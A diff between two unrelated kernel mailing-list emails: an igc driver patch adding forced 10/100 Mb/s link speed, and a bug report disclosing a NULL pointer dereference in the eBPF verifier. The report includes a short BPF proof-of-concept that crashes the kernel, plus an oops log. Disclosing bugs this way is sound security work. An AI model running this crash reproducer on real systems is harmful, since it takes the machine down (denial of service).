@@ -1,561 +1,216 @@
-Return-Path: <netdev+bounces-278909-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-278905-lists+netdev=lfdr.de@vger.kernel.org>
 Delivered-To: lists+netdev@lfdr.de
 Received: from mail.lfdr.de
 	by lfdr with LMTP
-	id tXb8FCFI4GlieQAAu9opvQ
-	(envelope-from <netdev+bounces-278909-lists+netdev=lfdr.de@vger.kernel.org>)
-	for <lists+netdev@lfdr.de>; Thu, 16 Apr 2026 04:23:29 +0200
+	id OFrjNKFG4GkPeQAAu9opvQ
+	(envelope-from <netdev+bounces-278905-lists+netdev=lfdr.de@vger.kernel.org>)
+	for <lists+netdev@lfdr.de>; Thu, 16 Apr 2026 04:17:05 +0200
 X-Original-To: lists+netdev@lfdr.de
 Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
-	by mail.lfdr.de (Postfix) with ESMTPS id 0B448409AFE
-	for <lists+netdev@lfdr.de>; Thu, 16 Apr 2026 04:23:28 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id A8944409A90
+	for <lists+netdev@lfdr.de>; Thu, 16 Apr 2026 04:17:04 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sea.lore.kernel.org (Postfix) with ESMTP id 75B743148D50
-	for <lists+netdev@lfdr.de>; Thu, 16 Apr 2026 02:18:46 +0000 (UTC)
+	by sea.lore.kernel.org (Postfix) with ESMTP id 14A38308D6CD
+	for <lists+netdev@lfdr.de>; Thu, 16 Apr 2026 02:17:03 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id CC7D3242D72;
-	Thu, 16 Apr 2026 02:18:44 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id DCE4E223708;
+	Thu, 16 Apr 2026 02:17:01 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=fail reason="signature verification failed" (2048-bit key) header.d=intel.com header.i=@intel.com header.b="em22+sXh"
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="CNjV2Sdn"
 X-Original-To: netdev@vger.kernel.org
-Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.12])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-oa1-f43.google.com (mail-oa1-f43.google.com [209.85.160.43])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 02DF8243376;
-	Thu, 16 Apr 2026 02:18:42 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=192.198.163.12
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1776305924; cv=none; b=JadC2Yhc3yDANcxrtzQZK6vt/U0CIrnpT+lRQI9oSy0cQvxIDtbTCRKdEPbf6BQ+f67w7baNWZRCB7BdGjD53u1Xg9dCz+0ymoM6j2R+hwVIrXuRyxijqK30px84AS96lZifUXiCAmoi/L4c+pkUDx1aPYi9m7dJAmL2a0Dy5/c=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1776305924; c=relaxed/simple;
-	bh=PkQbF9vBCNjOV+o+TToXri+Rgc8i9KGytnmeSXd+4Fw=;
-	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version; b=k8sUineWcooWHHHzU5YBgu4koXVez32yLHsOkDaQYLOx1NBLtHS3Y8kc/S/3lV8zc2LEbxD4ARx0AmoXgHAL/XtJyp2Qk/mmsofYqXz12FDnE3MMBFNUnXeFdDt5RSofCqgE2OOBWTTUd7PX1F4Z+kSWROc+g5BThB+3kAh+C3E=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.intel.com; spf=pass smtp.mailfrom=linux.intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=em22+sXh; arc=none smtp.client-ip=192.198.163.12
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.intel.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=linux.intel.com
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
-  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
-  t=1776305923; x=1807841923;
-  h=from:to:cc:subject:date:message-id:in-reply-to:
-   references:mime-version:content-transfer-encoding;
-  bh=PkQbF9vBCNjOV+o+TToXri+Rgc8i9KGytnmeSXd+4Fw=;
-  b=em22+sXhF9+xoSQuJhHjhL5f5FVyy9Q3ff/C8dHj0Z/k+bsPBYn6m8rC
-   zwbOZR4Xw20R/RUoeX3nlNbfVoZ4tAi15Hy5A7kKMgK2aanUpiVf9N8B7
-   89fL1XruzjMBp4kjcFF6OhH71pCHIWZNDgOkX+dxPSgHvkyx2/x5fxR5M
-   Xi8+SBqPJVJ1rlqV6S4mZ1ESuYkWpV7wl8Hko6BqLE1Iv3X4emGchXLLk
-   kUcnKqCRbrZLS6Xy2ptbT9VIquMdhmb0gov9P/2W+wqMYM/iNx328RKpW
-   QaiBdxQShMjRTj5dwxdtfucazzgn8JcTEyP+tZkXzGInOdq1GNEeCYb1Q
-   g==;
-X-CSE-ConnectionGUID: thz0hKlUQh+DU9R4Cc3fIg==
-X-CSE-MsgGUID: yRlm6fHdTNaWACz6LPXPUQ==
-X-IronPort-AV: E=McAfee;i="6800,10657,11760"; a="81177744"
-X-IronPort-AV: E=Sophos;i="6.23,181,1770624000"; 
-   d="scan'208";a="81177744"
-Received: from fmviesa007.fm.intel.com ([10.60.135.147])
-  by fmvoesa106.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 15 Apr 2026 19:18:42 -0700
-X-CSE-ConnectionGUID: ZxDNM8zsT2uetWaJ4+Y3Xg==
-X-CSE-MsgGUID: m35bUk02SLijlNesmhVboA==
-X-ExtLoop1: 1
-X-IronPort-AV: E=Sophos;i="6.23,181,1770624000"; 
-   d="scan'208";a="227442212"
-Received: from unknown (HELO localhost.png.intel.com) ([10.107.255.61])
-  by fmviesa007.fm.intel.com with ESMTP; 15 Apr 2026 19:18:38 -0700
-From: KhaiWenTan <khai.wen.tan@linux.intel.com>
-To: anthony.l.nguyen@intel.com,
-	przemyslaw.kitszel@intel.com,
-	andrew+netdev@lunn.ch,
-	davem@davemloft.net,
-	edumazet@google.com,
-	kuba@kernel.org,
-	pabeni@redhat.com
-Cc: intel-wired-lan@lists.osuosl.org, netdev@vger.kernel.org,
-	linux-kernel@vger.kernel.org, faizal.abdul.rahim@intel.com,
-	hong.aun.looi@intel.com, khai.wen.tan@intel.com,
-	Faizal Rahim <faizal.abdul.rahim@linux.intel.com>,
-	Looi@web.codeaurora.org, KhaiWenTan <khai.wen.tan@linux.intel.com>
-Subject: [PATCH iwl-next v2 3/3] igc: add support for forcing link speed without autonegotiation
-Date: Thu, 16 Apr 2026 09:55:20 +0800
-Message-ID: <20260416015520.6090-4-khai.wen.tan@linux.intel.com>
-X-Mailer: git-send-email 2.43.0
-In-Reply-To: <20260416015520.6090-1-khai.wen.tan@linux.intel.com>
-References: <20260416015520.6090-1-khai.wen.tan@linux.intel.com>
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7E1D319CD03
+	for <netdev@vger.kernel.org>; Thu, 16 Apr 2026 02:17:00 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.160.43
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1776305821; cv=pass; b=UjMIzmAYAR2sMRMtBARMAPRXhe8tYpaENHmGProUf+1WzgCmeaVUo5p3IstyN9WSnNKxxpQT/tRKpxyfsmbA6wE6s/DJot6n8rU4DujSWd/DbGi2pM02VQGIuBNrJFiVwejdqtYRem/GaJTsz08TIWUTjQNn5XSEAAEu4M18BJM=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1776305821; c=relaxed/simple;
+	bh=wQiqqhufJb3tgxCD7PXkpOY37pzGWg0bq19XBLHfrVQ=;
+	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=FOwVNzmULJg24nrSobYf05ojwGPDz1m1535vKOZUoFCAFvk/6ehJlVM7QCBCjjOoEXkgSvTM3Jj4yO3DBcIcKoBDeHOoLLILOPaXXqFnb+san8xyZk8aevvczk2zek6ppITGzvCDLNOhwjvHQXMNVhslcV90CQz2GHxzDx4LGUM=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=CNjV2Sdn; arc=pass smtp.client-ip=209.85.160.43
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+Received: by mail-oa1-f43.google.com with SMTP id 586e51a60fabf-40ea36b56b7so5603111fac.3
+        for <netdev@vger.kernel.org>; Wed, 15 Apr 2026 19:17:00 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1776305819; cv=none;
+        d=google.com; s=arc-20240605;
+        b=OVb3hnrczOtjXz9rkTfTdiMkCItXeHRdGP0LiOaDThGNMlLH5nzB25LFbDU71C2T8R
+         zzaZ7WHNoOVihuloVHR+gXsNtRKlP2yNPR13huLV4ns0RWAqYG5BDgB0QiSJ4IExnLfB
+         A1s91az62V/Pv63ppbw5SrDabKCVt6XBvtKu+Wgi0ssGsEM+HoPl6yNJ24tIgDGXMVJo
+         KUN+LiF4gEY2aHxdMvXVFpyFiVdR/6jE7GkrKVS65B5RYQqztv/mQWTv1nmRHb3ZrX+G
+         kbF4uFilNKEVsbDDgmNNczE6yn16N01oDWFC2L0ukwvLIT63T19MwznWOc+VWh9hXlZ+
+         KqaA==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :mime-version:dkim-signature;
+        bh=9vkatUbRivgvsdjHxZsjduzTdH/QUeQrYtw+cmD2zlY=;
+        fh=15yzLquNou/xpxXy1Qr5JJdBq44U5DhN6eBpnoqbD5I=;
+        b=Vn7oXyjhmwANcx21Cwu6fr55pp5qwpI447RcWCNHlbR8PK8G3BiWAzW7lW8cunfdos
+         r0asnK9j4MJeuVmSeMW4/jKcmNeXzlVWQoB1kOWldB0B82/PjJuvXhb5f8ptM1bMKAAQ
+         yl4OrqlUR3ek6DdGQ6V1F6ZBkijG6VxNnX5Tps8K/taCdMeiyd96QvXePbMp17qKzTxS
+         RDY1+SDsPR/QNRb9QDnGDU9f7mOL1kSBdMkJNjwfYsASu7mT48KhzxCyXQaqe2W8fPri
+         u4BcMnu0G0Uw6r7G4l1sRguJKRqD6R0Auqb3xHTqUuNyYJZQInDjzM/3iG8ntIALEzoM
+         FH3w==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1776305819; x=1776910619; darn=vger.kernel.org;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :mime-version:from:to:cc:subject:date:message-id:reply-to;
+        bh=9vkatUbRivgvsdjHxZsjduzTdH/QUeQrYtw+cmD2zlY=;
+        b=CNjV2SdnWRicGal81q+BFRSAh+lYHteGGGT48BvzsJlt4srFyI5BhWr98TCeWYs/0r
+         bBOgKbJtbiUjcY/g0j7c71IFFEhKcKV7ag2QsYn+aCHFXzryMu7w73OgBb8Vux6DTLI8
+         e4XvCUPN8DLTXqqZgC93nYTRUg0ncScstoRi/C+fT39WrVo0au/3dc4FGQGGV2dutdjd
+         nfhqZ33jQmLT33eU+KMc+4fgB6s5VvAnHN+X0tj2AflM/8rmT91ZOMgKAScf0x5xBjO3
+         w4X4q4TRz/mVpKG5HRsAQt2Fm1GH1Gvz0MRUzeucMuNiqfFlHQyhd/Zye657yCZAH/oJ
+         AWpg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1776305819; x=1776910619;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :mime-version:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=9vkatUbRivgvsdjHxZsjduzTdH/QUeQrYtw+cmD2zlY=;
+        b=Gf+5c1nH5NJHlVOlyCZ2NMjMaKJtNqTAAtV6Nocqmjeam4bxI1+S5kN8PHLlgqHoty
+         sFIyifJleLdQLHU2VeG3+ya22SbeJyIxmOEbKxSVczQZ4EzbssLFnWZgkF/Jef4V/2iT
+         9+v4eJPrz2Gcf769ihuYo87oF+0UmrnHM1N6FITE0FqW2fHAJRuXx3ZdJveU7488IDHS
+         8caTCvpuxCyneFHBOoWkF+hHv3l0lnlZO+iB3UyvexClMsoEyXttafMKnWKVzpisd30z
+         fZHSvobDBgIEMVy+5xBEbx3XrmzBwozUPpKSLGgd7vdqWSWVgGzxaEesR3MSTWfP3fFv
+         U3Bw==
+X-Forwarded-Encrypted: i=1; AFNElJ/34yAXgCdytOZyr9KYasZdJ3VzCqoAncfCZaaCJ8RZh3uIk/mO48pBV+KMdGIgETlpl9bIg7g=@vger.kernel.org
+X-Gm-Message-State: AOJu0Yx1Xqa9nVa0sWbfSxH+5HyZNqI2/KiNooT+8TOgg6WtGvXxqzMT
+	2ZezcHQDo/KB8yhSkn+FhTJZoOosugJr8SC1I4dyEQeinrFEZwwYXoIXM2VI4QZbo8E1PBhJiA7
+	5eTj00OtnK1EXFK56k3bvVql8fPzJGdw=
+X-Gm-Gg: AeBDiesxIO4KlcBM6eAB03nymNrSzqDtE8btvq5uoyFvNeKcaV2pQBW8uxL3e3G/VCR
+	2HHpl7QF2L87Q8v6DZtGwbDBqdhpkXVLQJFtkEgcFlJc2J8YX6g5gJG1ttFrgeAmb3jQzUUlcWR
+	qqCnA7elDXKfyK3hDy9Ggw5QLf+0JnNfuxr50wTUepl8L5ewrXtM4dpZ32CwSZNVOljSRx1DwRw
+	P3TisV3NpXXrX0cSo908sVzU8knr0enJCVfwKlziQeNpHAtDaO4fvL72RbsSAtpX8d91n1WHbc3
+	jm7glw==
+X-Received: by 2002:a05:6870:420f:b0:417:5105:a735 with SMTP id
+ 586e51a60fabf-423e11118ecmr13498590fac.33.1776305819281; Wed, 15 Apr 2026
+ 19:16:59 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
-X-Spamd-Result: default: False [4.64 / 15.00];
-	SUSPICIOUS_RECIPS(1.50)[];
-	MID_CONTAINS_FROM(1.00)[];
-	ARC_REJECT(1.00)[signature check failed: fail, {[1] = sig:subspace.kernel.org:reject}];
-	R_DKIM_REJECT(1.00)[intel.com:s=Intel];
-	R_MISSING_CHARSET(0.50)[];
+From: Hiker Cl <clhiker365@gmail.com>
+Date: Thu, 16 Apr 2026 10:16:46 +0800
+X-Gm-Features: AQROBzBYX4zd6BdxBIcwUa7EyBGQ0SzGZ4lXbLy4c9ax8OzRHuVydFZsHlg57oI
+Message-ID: <CAGM=xGABGeeGVU7hy_mRr_rp377dBzVVAOpkLnuYKb8XyEs7Hg@mail.gmail.com>
+Subject: NULL pointer dereference in map_kptr_match_type when storing scalar
+ values into kptr slots
+To: bpf@vger.kernel.org
+Cc: linux-kernel@vger.kernel.org, netdev@vger.kernel.org
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+X-Spamd-Result: default: False [-2.16 / 15.00];
+	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
+	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
 	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
+	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
 	MAILLIST(-0.15)[generic];
 	MIME_GOOD(-0.10)[text/plain];
-	DMARC_POLICY_SOFTFAIL(0.10)[intel.com : SPF not aligned (relaxed),none];
 	HAS_LIST_UNSUB(-0.01)[];
-	GREYLIST(0.00)[pass,meta];
-	FORGED_SENDER_MAILLIST(0.00)[];
-	ASN_FAIL(0.00)[10.253.234.172.asn.rspamd.com:server fail];
+	TAGGED_FROM(0.00)[bounces-278905-lists,netdev=lfdr.de];
 	RCVD_TLS_LAST(0.00)[];
-	MIME_TRACE(0.00)[0:+];
-	RCPT_COUNT_TWELVE(0.00)[16];
-	TAGGED_FROM(0.00)[bounces-278909-lists,netdev=lfdr.de];
-	PRECEDENCE_BULK(0.00)[];
-	RCVD_COUNT_FIVE(0.00)[5];
-	NEURAL_SPAM(0.00)[0.769];
-	TAGGED_RCPT(0.00)[netdev];
-	FROM_HAS_DN(0.00)[];
+	RCVD_COUNT_THREE(0.00)[4];
+	FORGED_SENDER_MAILLIST(0.00)[];
 	FORGED_RECIPIENTS_MAILLIST(0.00)[];
-	TO_DN_SOME(0.00)[];
-	DKIM_TRACE(0.00)[intel.com:-];
-	FROM_NEQ_ENVFROM(0.00)[khai.wen.tan@linux.intel.com,netdev@vger.kernel.org];
-	DBL_BLOCKED_OPENRESOLVER(0.00)[linux.intel.com:mid,intel.com:email,sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns]
-X-Rspamd-Queue-Id: 0B448409AFE
+	ASN_FAIL(0.00)[10.253.234.172.asn.rspamd.com:server fail];
+	MIME_TRACE(0.00)[0:+];
+	FROM_HAS_DN(0.00)[];
+	MISSING_XM_UA(0.00)[];
+	RCPT_COUNT_THREE(0.00)[3];
+	TO_DN_NONE(0.00)[];
+	PRECEDENCE_BULK(0.00)[];
+	FROM_NEQ_ENVFROM(0.00)[clhiker365@gmail.com,netdev@vger.kernel.org];
+	DKIM_TRACE(0.00)[gmail.com:+];
+	NEURAL_HAM(-0.00)[-1.000];
+	TAGGED_RCPT(0.00)[netdev];
+	MID_RHS_MATCH_FROMTLD(0.00)[];
+	FREEMAIL_FROM(0.00)[gmail.com];
+	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,mail.gmail.com:mid]
+X-Rspamd-Queue-Id: A8944409A90
 X-Rspamd-Action: no action
 X-Rspamd-Server: lfdr
 
-From: Faizal Rahim <faizal.abdul.rahim@linux.intel.com>
+Hi BPF maintainers,
 
-Allow users to force 10/100 Mb/s link speed and duplex via ethtool
-when autonegotiation is disabled. Previously, the driver rejected
-these requests with "Force mode currently not supported.".
+I'm reporting a bug I encountered in the BPF subsystem on Linux kernel
+version 7.0.0-g1f5ffc672165.
 
-Forcing at 1000 Mb/s and 2500 Mb/s is not supported.
+### Summary
+A NULL pointer dereference vulnerability was discovered in the eBPF
+verifier. A local user can trigger this by loading a BPF program that
+attempts to store a scalar value (non-pointer) into a map slot
+designated as a kptr (kernel pointer). This leads to an immediate
+kernel crash (DoS).
+### Environment
+- Kernel version: 7.0.0-rc6 (Commit: 71b500afd2f7 from bpf-next tree),
+7.0.0-g1f5ffc672165 (Commit: 1f5ffc672165 from linux tree)
+- Architecture: x86_64
+- Config: BPF_SYSCALL=3Dy, DEBUG_INFO_BTF=3Dy
 
-Reviewed-by: Looi, Hong Aun <hong.aun.looi@intel.com>
-Signed-off-by: Faizal Rahim <faizal.abdul.rahim@linux.intel.com>
-Signed-off-by: KhaiWenTan <khai.wen.tan@linux.intel.com>
----
- drivers/net/ethernet/intel/igc/igc_base.c    |  35 ++++-
- drivers/net/ethernet/intel/igc/igc_defines.h |   9 +-
- drivers/net/ethernet/intel/igc/igc_ethtool.c | 131 +++++++++++++------
- drivers/net/ethernet/intel/igc/igc_hw.h      |   9 ++
- drivers/net/ethernet/intel/igc/igc_mac.c     |  10 ++
- drivers/net/ethernet/intel/igc/igc_main.c    |   2 +-
- drivers/net/ethernet/intel/igc/igc_phy.c     |  65 ++++++++-
- drivers/net/ethernet/intel/igc/igc_phy.h     |   1 +
- 8 files changed, 211 insertions(+), 51 deletions(-)
+### Steps to Reproduce =EF=BC=88poc.c)
+#include "vmlinux.h"
+#include <bpf/bpf_helpers.h>
+/* BTF type tags for kptrs */
+#ifndef __kptr_untrusted
+#define __kptr_untrusted __attribute__((btf_type_tag("kptr_untrusted")))
+#endif
+struct map_value {
+struct task_struct __kptr_untrusted *ptr;
+};
+struct {
+__uint(type, BPF_MAP_TYPE_LRU_HASH);
+__uint(max_entries, 1);
+__type(key, int);
+__type(value, struct map_value);
+} crashing_map SEC(".maps");
+SEC("kprobe/htab_map_get_next_key")
+int trigger_crash(struct pt_regs *ctx)
+{
+int key =3D 0;
+u64 *val =3D bpf_map_lookup_elem(&crashing_map, &key);
+if (val) {
+/*
+* Trigger: Store a scalar (non-pointer) into a slot
+* designated as a kptr. The verifier's map_kptr_match_type
+* fails to handle the NULL reg->btf for scalars.
+*/
+*val =3D 0xdeadbeef;
+}
+return 0;
+}
+char LICENSE[] SEC("license") =3D "GPL";
 
-diff --git a/drivers/net/ethernet/intel/igc/igc_base.c b/drivers/net/ethernet/intel/igc/igc_base.c
-index 1613b562d17c..ab9120a3127f 100644
---- a/drivers/net/ethernet/intel/igc/igc_base.c
-+++ b/drivers/net/ethernet/intel/igc/igc_base.c
-@@ -114,11 +114,35 @@ static s32 igc_setup_copper_link_base(struct igc_hw *hw)
- 	u32 ctrl;
+### Kernel Log Extract
+[   91.277247][ T7627] Oops: general protection fault, probably for
+non-canonical address 0xdffffc0000I
+[   91.279715][ T7627] KASAN: null-ptr-deref in range
+[0x00000000000000e8-0x00000000000000ef]
+[   91.280906][ T7627] CPU: 0 UID: 0 PID: 7627 Comm: bpftool Not
+tainted 7.0.0-g1f5ffc672165 #5 PREEMPT(full)
+[   91.282421][ T7627] Hardware name: QEMU Standard PC (i440FX + PIIX,
+1996), BIOS 1.15.0-1 04/01/2014
+[   91.283556][ T7627] RIP: 0010:btf_is_kernel+0x2a/0x50
+...
 
- 	ctrl = rd32(IGC_CTRL);
--	ctrl |= IGC_CTRL_SLU;
--	ctrl &= ~(IGC_CTRL_FRCSPD | IGC_CTRL_FRCDPX);
--	wr32(IGC_CTRL, ctrl);
--
--	ret_val = igc_setup_copper_link(hw);
-+	ctrl &= ~(IGC_CTRL_FRCSPD | IGC_CTRL_FRCDPX |
-+		  IGC_CTRL_SPEED_MASK | IGC_CTRL_FD);
-+
-+	if (hw->mac.autoneg_enabled) {
-+		ctrl |= IGC_CTRL_SLU;
-+		wr32(IGC_CTRL, ctrl);
-+		ret_val = igc_setup_copper_link(hw);
-+	} else {
-+		ctrl |= IGC_CTRL_SLU | IGC_CTRL_FRCSPD | IGC_CTRL_FRCDPX;
-+
-+		switch (hw->mac.forced_speed_duplex) {
-+		case IGC_FORCED_10H:
-+			ctrl |= IGC_CTRL_SPEED_10;
-+			break;
-+		case IGC_FORCED_10F:
-+			ctrl |= IGC_CTRL_SPEED_10 | IGC_CTRL_FD;
-+			break;
-+		case IGC_FORCED_100H:
-+			ctrl |= IGC_CTRL_SPEED_100;
-+			break;
-+		case IGC_FORCED_100F:
-+			ctrl |= IGC_CTRL_SPEED_100 | IGC_CTRL_FD;
-+			break;
-+		default:
-+			return -IGC_ERR_CONFIG;
-+		}
-+		wr32(IGC_CTRL, ctrl);
-+		ret_val = igc_setup_copper_link(hw);
-+	}
+### Actual Results
+The kernel crashes during the verification phase. The verifier calls
+`map_kptr_match_type`, which subsequently calls
+`btf_is_kernel(reg->btf)`. Since the source register is a scalar,
+`reg->btf` is NULL, leading to a NULL pointer dereference.
 
- 	return ret_val;
- }
-@@ -443,6 +467,7 @@ static const struct igc_phy_operations igc_phy_ops_base = {
- 	.reset			= igc_phy_hw_reset,
- 	.read_reg		= igc_read_phy_reg_gpy,
- 	.write_reg		= igc_write_phy_reg_gpy,
-+	.force_speed_duplex	= igc_force_speed_duplex,
- };
+Detailed info including reproducible BPF program and kernel logs have
+been filed on Bugzilla:
 
- const struct igc_info igc_base_info = {
-diff --git a/drivers/net/ethernet/intel/igc/igc_defines.h b/drivers/net/ethernet/intel/igc/igc_defines.h
-index 9482ab11f050..3f504751c2d9 100644
---- a/drivers/net/ethernet/intel/igc/igc_defines.h
-+++ b/drivers/net/ethernet/intel/igc/igc_defines.h
-@@ -129,10 +129,13 @@
- #define IGC_ERR_SWFW_SYNC		13
+  https://bugzilla.kernel.org/show_bug.cgi?id=3D221372
 
- /* Device Control */
-+#define IGC_CTRL_FD		BIT(0)  /* Full Duplex */
- #define IGC_CTRL_RST		0x04000000  /* Global reset */
--
- #define IGC_CTRL_PHY_RST	0x80000000  /* PHY Reset */
- #define IGC_CTRL_SLU		0x00000040  /* Set link up (Force Link) */
-+#define IGC_CTRL_SPEED_MASK	GENMASK(10, 8)
-+#define IGC_CTRL_SPEED_10	FIELD_PREP(IGC_CTRL_SPEED_MASK, 0)
-+#define IGC_CTRL_SPEED_100	FIELD_PREP(IGC_CTRL_SPEED_MASK, 1)
- #define IGC_CTRL_FRCSPD		0x00000800  /* Force Speed */
- #define IGC_CTRL_FRCDPX		0x00001000  /* Force Duplex */
- #define IGC_CTRL_VME		0x40000000  /* IEEE VLAN mode enable */
-@@ -673,6 +676,10 @@
- #define IGC_GEN_POLL_TIMEOUT	1920
-
- /* PHY Control Register */
-+#define MII_CR_SPEED_MASK	(BIT(6) | BIT(13))
-+#define MII_CR_SPEED_10		0x0000	/* SSM=0, SSL=0: 10 Mb/s */
-+#define MII_CR_SPEED_100	BIT(13)	/* SSM=0, SSL=1: 100 Mb/s */
-+#define MII_CR_DUPLEX_EN	BIT(8)	/* 0 = Half Duplex, 1 = Full Duplex */
- #define MII_CR_RESTART_AUTO_NEG	0x0200  /* Restart auto negotiation */
- #define MII_CR_POWER_DOWN	0x0800  /* Power down */
- #define MII_CR_AUTO_NEG_EN	0x1000  /* Auto Neg Enable */
-diff --git a/drivers/net/ethernet/intel/igc/igc_ethtool.c b/drivers/net/ethernet/intel/igc/igc_ethtool.c
-index cfcbf2fdad6e..5bd37d1be168 100644
---- a/drivers/net/ethernet/intel/igc/igc_ethtool.c
-+++ b/drivers/net/ethernet/intel/igc/igc_ethtool.c
-@@ -1914,44 +1914,58 @@ static int igc_ethtool_get_link_ksettings(struct net_device *netdev,
- 	ethtool_link_ksettings_add_link_mode(cmd, supported, TP);
- 	ethtool_link_ksettings_add_link_mode(cmd, advertising, TP);
-
--	/* advertising link modes */
--	if (hw->phy.autoneg_advertised & ADVERTISE_10_HALF)
--		ethtool_link_ksettings_add_link_mode(cmd, advertising, 10baseT_Half);
--	if (hw->phy.autoneg_advertised & ADVERTISE_10_FULL)
--		ethtool_link_ksettings_add_link_mode(cmd, advertising, 10baseT_Full);
--	if (hw->phy.autoneg_advertised & ADVERTISE_100_HALF)
--		ethtool_link_ksettings_add_link_mode(cmd, advertising, 100baseT_Half);
--	if (hw->phy.autoneg_advertised & ADVERTISE_100_FULL)
--		ethtool_link_ksettings_add_link_mode(cmd, advertising, 100baseT_Full);
--	if (hw->phy.autoneg_advertised & ADVERTISE_1000_FULL)
--		ethtool_link_ksettings_add_link_mode(cmd, advertising, 1000baseT_Full);
--	if (hw->phy.autoneg_advertised & ADVERTISE_2500_FULL)
--		ethtool_link_ksettings_add_link_mode(cmd, advertising, 2500baseT_Full);
--
- 	/* set autoneg settings */
- 	ethtool_link_ksettings_add_link_mode(cmd, supported, Autoneg);
--	ethtool_link_ksettings_add_link_mode(cmd, advertising, Autoneg);
-+	if (hw->mac.autoneg_enabled) {
-+		ethtool_link_ksettings_add_link_mode(cmd, advertising, Autoneg);
-+		cmd->base.autoneg = AUTONEG_ENABLE;
-+
-+		/* advertising link modes only apply when autoneg is on */
-+		if (hw->phy.autoneg_advertised & ADVERTISE_10_HALF)
-+			ethtool_link_ksettings_add_link_mode(cmd, advertising,
-+							     10baseT_Half);
-+		if (hw->phy.autoneg_advertised & ADVERTISE_10_FULL)
-+			ethtool_link_ksettings_add_link_mode(cmd, advertising,
-+							     10baseT_Full);
-+		if (hw->phy.autoneg_advertised & ADVERTISE_100_HALF)
-+			ethtool_link_ksettings_add_link_mode(cmd, advertising,
-+							     100baseT_Half);
-+		if (hw->phy.autoneg_advertised & ADVERTISE_100_FULL)
-+			ethtool_link_ksettings_add_link_mode(cmd, advertising,
-+							     100baseT_Full);
-+		if (hw->phy.autoneg_advertised & ADVERTISE_1000_FULL)
-+			ethtool_link_ksettings_add_link_mode(cmd, advertising,
-+							     1000baseT_Full);
-+		if (hw->phy.autoneg_advertised & ADVERTISE_2500_FULL)
-+			ethtool_link_ksettings_add_link_mode(cmd, advertising,
-+							     2500baseT_Full);
-+
-+		/* Set pause flow control advertising */
-+		switch (hw->fc.requested_mode) {
-+		case igc_fc_full:
-+			ethtool_link_ksettings_add_link_mode(cmd, advertising,
-+							     Pause);
-+			break;
-+		case igc_fc_rx_pause:
-+			ethtool_link_ksettings_add_link_mode(cmd, advertising,
-+							     Pause);
